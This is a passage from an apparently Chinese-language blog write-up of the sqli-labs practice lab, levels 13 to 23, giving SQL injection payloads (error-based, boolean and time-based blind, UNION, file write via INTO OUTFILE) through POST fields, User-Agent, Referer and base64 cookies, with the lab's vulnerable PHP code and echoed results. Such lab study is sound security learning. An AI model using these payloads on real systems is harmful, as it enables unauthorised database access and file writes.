class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or extractvalue(1, concat(0x7e,(database()),0x7e))#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;</span>~security~<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>2、布尔注入<br>仅作库名长度演示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&#x27;) or length(database())=8#&amp;passwd=q&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">回显，这里查看源码成功的图片名是/images/flag.jpg，失败的为 /images/slap.jpg</span></span><br><span class="line"><span class="string">可以根据文件名逐一爆破，不一一展开，和之前一样。</span></span><br></pre></td></tr></table></figure><h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h3><p><strong>POST型-双引号-无回显-布尔&#x2F;报错注入</strong>   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=<span class="number">1</span><span class="string">&quot;&amp;passwd=2&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显，推断后端加了双引号</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;2&quot;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>和level-13原理一样，只是后端少加了单括号，不细致展开。</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h3><p><strong>POST型-单引号-无回显-布尔&#x2F;时间盲注&#x2F;文件写入</strong><br>这里发现可以布尔注入就一定可以时间盲注，这里因为成功&#x2F;失败图片名不一样，用布尔更快一些<br>猜测后台加工：加单引号，测试<code>username=a&#39; or 1#</code> ，回显成功<br>1、布尔&#x2F;时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data </span><br><span class="line">布尔：</span><br><span class="line">uname=a<span class="string">&#x27; or length(database())=8#&amp;passwd=a&amp;submit=Submit</span></span><br><span class="line"><span class="string">时间盲注：</span></span><br><span class="line"><span class="string">uname=a&#x27;</span> <span class="keyword">or</span> <span class="keyword">if</span>((length(database())=<span class="number">8</span>),sleep(<span class="number">2</span>),null)<span class="comment">#&amp;passwd=a&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>2、文件写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a<span class="string">&#x27; union select 1,0x7e into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-15\\test.txt&quot;#&amp;passwd=a&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">test.txt内容</span></span><br><span class="line"><span class="string">1~</span></span><br></pre></td></tr></table></figure><p>具体不展开，和之前一样</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h3><p><strong>POST型-双引号-单括号-无回显-布尔&#x2F;时间盲注&#x2F;文件写入</strong><br>同level-15，把id改一下即可，后端加工为 添加 <code>&quot;)</code>，不具体展开了</p><h3 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h3><p><strong>有转义-update函数-单引号-布尔&#x2F;报错注入</strong><br>这一级用了新函数，要update<br>我们看一下后端关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  <span class="comment">#check_input会转义单引号，所以admin不好利用</span></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]; <span class="comment">#passwd没有被转义</span></span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  </span><br><span class="line"><span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要是闭合update语句，这里仅展示爆数据库名长度，后面不一一展示<br>1、报错注入<br>floor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)#&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Duplicate entry &#x27;</span>~security~<span class="number">1</span><span class="string">&#x27; for key &#x27;</span>group_key<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>updatexml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or updatexml(1,concat(0x7e,(database()),0x7e),1)#&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">&gt;XPATH syntax error: &#x27;</span>~security~</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e))#&amp;submit=Submit</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">&gt;XPATH syntax error: &#x27;</span>~security~</span><br></pre></td></tr></table></figure><p>2、时间盲注<br>仅展示爆数据库长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="string">b&#x27;or if(length(database()=8),sleep(2),null)#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h3><p><strong>请求头（User-Agen）-注入-报错&#x2F;时间注入</strong><br>看了后端源码，加了过滤，只能注入hear里的user-agent<br>关键代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br></pre></td></tr></table></figure><p>可控的是<code>uagent</code> 、<code>uname</code>,uname因为必须是表里的，所以不能利用，可以利用uagent即        <code>HTTP_USER_AGENT</code>  </p><p>分析语句,拼接,这里本以为报错注入只需要把句子放在最后就行了，发现不行<br>只有放在参数位置才可以产生报错<br>1、报错注入 ，仅爆库名<br><strong>floor</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27; or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27; or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">回显</span><br><span class="line">Duplicate entry <span class="string">&#x27;~security~1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>updatexml</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27;or updatexml(1,concat(0x7e,(database()),0x7e),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">&gt;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27;or updatexml(1,concat(0x7e,(database()),0x7e),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">回显</span><br><span class="line">&gt;XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>extractvalue</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27;or c, &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e)), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p>2、时间盲注，仅展示库名长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27;or if(length(database()=8),sleep(3),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27;or if(length(database()=8),sleep(3),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">回显</span><br><span class="line">慢了三秒</span><br></pre></td></tr></table></figure><h3 id="level-19"><a href="#level-19" class="headerlink" title="level-19"></a>level-19</h3><p><strong>请求头（Referer）-注入-报错&#x2F;时间注入</strong><br>查看后端代码，类似level-18，只不过换了变量<br>仅展示extractvalue，其余一样，即<code>Referer: a&#39;or PAYLOAD, &#39;123&#39;)#</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">Referer: a<span class="string">&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e)), &#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;</span>a<span class="string">&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e)), &#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>)</span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="level-20"><a href="#level-20" class="headerlink" title="level-20"></a>level-20</h3><p><strong>请求头（cookie）-简单跳转-注入</strong><br>这里直接burp抓包，发现两次请求，第一次为POST，第二次为GET<br><img src="/2022/02/17/sqli-labs/2022-02-21-23-05-39.png"><br>重复第一次POST并不能获得有效价值回显，第二次GET才有<br>查看后端代码，得到关键代码，第一次登陆设置cookie，后面GET请求只需要cookie，并设置cookie寿命</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>]))<span class="comment">#为真则设置cookie，为假直接进入显示界面</span></span><br><span class="line">    &#123;</span><br><span class="line">    ---</span><br><span class="line">        <span class="variable">$cookee</span> = <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);<span class="comment">#设置cookie</span></span><br><span class="line">            <span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>);<span class="comment">#跳转，也就是在这里POST变成了GET</span></span><br><span class="line">    ---</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ---</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<span class="comment">#利用语句</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    ---</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可利用点在于伪造GET请求的cookie,从上面利用语句可以看出很简单<br>仅测试库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">爆字段数</span><br><span class="line">    Cookie: uname=admin<span class="string">&#x27; order by 3#</span></span><br><span class="line"><span class="string">    后端拼接后</span></span><br><span class="line"><span class="string">    &gt;SELECT * FROM users WHERE username=&#x27;</span>admin<span class="string">&#x27; order by 3#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    回显正常</span><br><span class="line">    得字段数为<span class="number">3</span></span><br><span class="line">爆库名</span><br><span class="line">    GET data</span><br><span class="line">    Cookie: uname=-admin<span class="string">&#x27; union select 1,2,3#</span></span><br><span class="line"><span class="string">    后端拼接后</span></span><br><span class="line"><span class="string">    &gt;SELECT * FROM users WHERE username=&#x27;</span>-admin<span class="string">&#x27; union select 1,2,3#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    回显</span><br><span class="line">    Your Login name:<span class="number">2</span> Your Password:<span class="number">3</span> Your ID:<span class="number">1</span> //<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>都可以利用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    GET data</span><br><span class="line">    Cookie: uname=-admin<span class="string">&#x27; union select 1,2,database()#</span></span><br><span class="line"><span class="string">    回显</span></span><br><span class="line"><span class="string">    Your Password:security</span></span><br></pre></td></tr></table></figure><h3 id="level-21"><a href="#level-21" class="headerlink" title="level-21"></a>level-21</h3><p><strong>请求头（cookie）-简单跳转base64-单引号-单括号-注入</strong><br>原理类似于level-20，不过加了单引号单括号，虽然cookie存储时 base64加密了，但是sql查询时又解了<br>查看正常包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /sqli-labs/Less-<span class="number">21</span>/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">72.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">72.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/sqli-labs/Less-<span class="number">21</span>/</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: uname=YWRtaW4%3D 这里base64加密了</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>关键代码还是差不多，我只需要把cookie对应加密一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>直接测试库名，前后都不展开了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原语句</span><br><span class="line">-admin<span class="string">&#x27;) union select 1,2,database()#</span></span><br><span class="line"><span class="string">GET data</span></span><br><span class="line"><span class="string">Cookie: uname=-admin&#x27;</span>) union select <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">#</span></span><br><span class="line">拼接后</span><br><span class="line">SELECT * FROM users WHERE username=(<span class="string">&#x27;=-admin&#x27;</span>) union select <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">#&#x27;)</span></span><br><span class="line">回显</span><br><span class="line">&gt;Your Login name:<span class="number">2</span> Your Password:security Your ID:<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="level-22"><a href="#level-22" class="headerlink" title="level-22"></a>level-22</h3><p><strong>请求头（cookie）-简单跳转base64-双引号-注入</strong><br>代码基本没变，只是再解密后，加了双引号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$cookee1</span> = <span class="string">&#x27;&quot;&#x27;</span>. <span class="variable">$cookee</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>直接测试库名，前后都不展开了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原语句</span><br><span class="line">uname=-admin<span class="string">&quot; union select 1,2,database()#</span></span><br><span class="line"><span class="string">GET data</span></span><br><span class="line"><span class="string">Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">&gt;SELECT * FROM users WHERE username=&quot;</span>-admin<span class="string">&quot; union select 1,2,database()#&quot;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">&gt;Your Login name:<span class="number">2</span> Your Password:security Your ID:<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>参考：</strong><br><a href="https://www.cnblogs.com/du892294464/p/6835277.html">php中实现页面跳转的几种方式</a></p><h2 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h2><h3 id="level-23"><a href="#level-23" class="headerlink" title="level-23"></a>level-23</h3><p><strong>字段回显-过滤（注释过滤）-简单&#x2F;报错注入</strong><br>简单输入,判断单引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br></pre></td></tr></table></figure><p>后端关键代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">过滤 <span class="comment"># --</span></span><br><span class="line">    $reg = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line">    $reg1 = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line">    $replace = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $<span class="built_in">id</span> = preg_replace($reg, $replace, $<span class="built_in">id</span>);</span><br><span class="line">    $<span class="built_in">id</span> = preg_replace($reg1, $replace, $<span class="built_in">id</span>);</span><br><span class="line">查询语句</span><br><span class="line">    $sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>所以就是换个方式达到注释得目的，或者让语句换种方式闭合可执行</p><p>1、<code>;%00</code>隔断<br>类似于%23&#x3D;#，%00在后端被转义后是个空白符，结合分号 ‘<code>;</code>’ sql语句读到这里就认后面没有了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;  or 1 ;%00</span></span><br><span class="line"><span class="string">后端处理后</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=&#x27;</span>-<span class="number">1</span><span class="string">&#x27; or 1;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> 这里‘;’后面是有一个acsii为<span class="number">0x00</span>的字符，发挥隔断的作用</span><br><span class="line"></span><br><span class="line">爆字段数</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; order by 4  ;%00</span></span><br><span class="line"><span class="string">爆库名</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-23/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,database() ;%<span class="number">00</span></span><br></pre></td></tr></table></figure><p>2、闭合语句，利用报错<br>前面说过，报错语句放在参数位，这里只使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">floor</span><br><span class="line">    GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span></span><br><span class="line">    后端处理后</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> (select <span class="number">1</span> <span class="keyword">from</span> (select count(*),concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>,floor (rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables group by x)a) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    回显</span><br><span class="line">    Duplicate entry <span class="string">&#x27;~security~1&#x27;</span> <span 